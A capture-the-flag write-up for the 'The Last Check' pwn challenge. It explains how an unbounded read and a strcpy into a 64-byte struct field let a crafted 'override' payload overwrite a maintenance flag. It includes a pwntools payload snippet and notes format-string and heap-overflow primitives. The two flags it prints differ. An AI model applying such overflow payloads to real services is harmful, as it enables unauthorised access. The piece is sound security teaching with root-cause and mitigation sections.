# The Last Check Write-up

## Challenge Overview
The challenge provides an interactive autopilot safety check binary (`the_last_check`) that accepts text commands and exposes several debug/utility subsystems. The program maintains an `aircraft_t` structure in memory and prints status in a loop. The goal is to obtain the flag, which is printed by `maintenance_flag()` when `maintenance_mode` is enabled.

On startup the program shows a status banner and waits for commands on stdin. Available command prefixes include `debug `, `heap `, `checksum `, `status`, `set altitude `, `disable autopilot`, and `override`.

---

## Binary Analysis

### File type and metadata
```
$ file the_last_check
the_last_check: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), dynamically linked, stripped
```

### Key strings
Running `strings the_last_check` shows UI and command names used by the program:
```
AUTOPILOT SAFETY CHECK INTERFACE
[STATUS]
Command > 
debug 
heap 
checksum 
status
set altitude 
disable autopilot
override
CRITICAL FAILURE!
Aircraft crashed :()
⚠ MAINTENANCE MODE ACTIVE ⚠
SEASIDES{Y0U_D1NDNT_F1ND_TH3_L4ST_CH3CK}
```

### Data structure
The program stores runtime data in an `aircraft_t` struct (relevant fields shown):

```c
typedef struct {
	int altitude;
	int pad1;
	int target_altitude;
	int pad2;
	int autopilot_enabled;
	int pad3;

	char last_cmd[64];   /* user command copied into the struct */

	int maintenance_mode;
	int integrity;
	int state;
	int pad4;
	int abuse_score;
} aircraft_t;
```

On x86_64 with 4‑byte `int` this places `maintenance_mode` immediately after `last_cmd` in memory (offset 64 from `last_cmd`). Overwriting `last_cmd` past 64 bytes therefore lets an attacker modify these control flags.

### Interesting subsystems
- `read_command()` reads raw input using `unsafe_read(buf)` which calls `read(0, buf, CMD_BUF * 2)` (no bounds, no NUL termination), then executes `strcpy(p->last_cmd, buf)` — copying the attacker-controlled buffer into the fixed-size `last_cmd` destination.
- `process_command()` recognizes command prefixes via `strncmp` and dispatches handlers such as `emergency_override()`, `debug_interface()`, `heap_service()`, and `checksum_interface()`.
- `emergency_override()` calls `maintenance_flag()` if `p->maintenance_mode` is non-zero; `maintenance_flag()` opens and prints `flag.txt`.
- `debug_interface()` allows printing arbitrary strings through `debug_log()` but only if `p->integrity == 0x1337` (a gated debug path). `debug_log()` itself calls `printf(msg);` — a format string sink — but requires the integrity gate to be set.
- `checksum_interface()` computes a simple checksum and calls `fake_flag()` if it equals `0x41414141` (a different route to the fake flag printed in code).

### Vulnerabilities identified

1. Destination buffer overflow (strcpy into `p->last_cmd`): `unsafe_read()` writes up to 128 bytes into a local stack buffer and `strcpy(p->last_cmd, buf)` copies that data into the `last_cmd` field (64 bytes) without bounds checking. This allows overwriting adjacent struct fields such as `maintenance_mode`, `integrity`, `state`, and `abuse_score` under attacker control.
2. Privileged actions gated by struct fields: setting `maintenance_mode` to a non-zero value causes `override` to invoke `maintenance_flag()` and print the real flag. Similarly, setting `integrity` to `0x1337` unlocks the debug print path.
3. Additional primitives: `heap_service()` copies user data into a small heap buffer (64 bytes) via `strcpy(heap, cmd + 5)` — a heap overflow path if `cmd+5` is longer than 64 bytes. `debug_log()` uses `printf(msg);` (format string sink) but is gated by the integrity value.

---

## Exploit Strategy
1. Use the `Command > ` input to send a single payload that both:
   - matches a command prefix (so `process_command()` executes the desired handler), and
   - overflows the destination `last_cmd` buffer in `aircraft_t` to set `maintenance_mode = 1`.
2. Because `process_command()` checks prefixes with `strncmp` (fixed-length compares), the payload can start with the ASCII command (e.g. `override`) and then provide padding and overwrite words to flip `maintenance_mode`.
3. When `process_command()` dispatches `override`, `emergency_override()` will see `p->maintenance_mode != 0` and call `maintenance_flag()` which reads and prints `flag.txt`.

Why this works:
- `strcpy(p->last_cmd, buf)` writes the entire NUL‑terminated `buf` into `p->last_cmd` destination. By constructing `buf` with no NUL until after the overflow region (i.e., terminate at the end), we can copy controlled bytes past the 64‑byte `last_cmd` field into `maintenance_mode` and further fields.
- `process_command()` operates on the same `buf` (the source) and checks only the command prefix lengths, so the initial bytes can be a valid command (e.g. `override`) while the rest of the buffer performs the overflow.

---

## Exploitation (manual)
1. Connect:

```bash
nc <IP> <PORT>
```

2. Construct an exploit payload that overwrites the `maintenance_mode` field via the buffer overflow in `strcpy(p->last_cmd, buf)`. The payload is:
    - `b"override" + b"A" * (64 - len(b"override")) + p32(1) + b"\x00"` (command + padding to 64 bytes + maintenance_mode=1 + NUL).

3. Send the payload when prompted for `Command > `.

4. The `process_command()` function will dispatch the `override` branch; `emergency_override()` will detect `maintenance_mode == 1` and call `maintenance_flag()` which prints the flag.

Example expected output:

```
⚠ MAINTENANCE MODE ACTIVE ⚠
SEASIDES{F1N4L_CH3CK_F41L3D_SUCC3SSFULLY}
```

---

## Automation Script

The repository includes a helper script (e.g. `solve_the_last_check.py`) which automates the exploit using `pwntools`.
- Connects to the remote service
- Builds an overflow payload that sets `maintenance_mode` and issues `override`
- Sends the payload when prompted by the program
- Switches to interactive mode to display the flag

Key payload construction:

```python
cmd = b'override'                        # valid command prefix
payload = cmd + b'A' * (64 - len(cmd))   # overflow last_cmd buffer
payload += p32(1)                        # set maintenance_mode = 1
payload += b'\x00'                      # terminate string for strcpy
```

---

## Root Cause

The primary bug is an unsafe combination of an unbounded `read()` and an unchecked `strcpy()` into a fixed-size struct field. This destination overflow lets an attacker corrupt adjacent control fields in the `aircraft_t` instance (e.g., `maintenance_mode`, `integrity`) and thereby escalate actions (triggering `maintenance_flag()` or unlocking debug paths).

Secondary issues include format-string and heap-copying primitives that could be used for alternative exploitation techniques (e.g. setting `integrity` to `0x1337` and abusing `debug_log()`'s `printf(msg);`).

## Mitigations

- Do not use `strcpy`/`gets`/unbounded `read` for network input. Use `fgets`/`readn`/`memcpy` with explicit size checks.
- Validate and bound command lengths before copying into fixed-size fields.
- Zero-initialize and validate critical control fields (e.g., `integrity`) and avoid printing sensitive function pointers or internals.
- Harden builds with stack canaries and ASLR; avoid exposing privileged debug paths in production.

---

## Conclusion

This challenge demonstrates a classic destination buffer overflow into a process-global struct. The combination of an unbounded input read and a blind `strcpy()` into a fixed-size struct field allows overwriting control flags and triggering a privileged code path that reveals the flag. The exploit is compact and reliable when the struct layout is known: craft a single command that both matches a handler and overwrites the `maintenance_mode` flag.

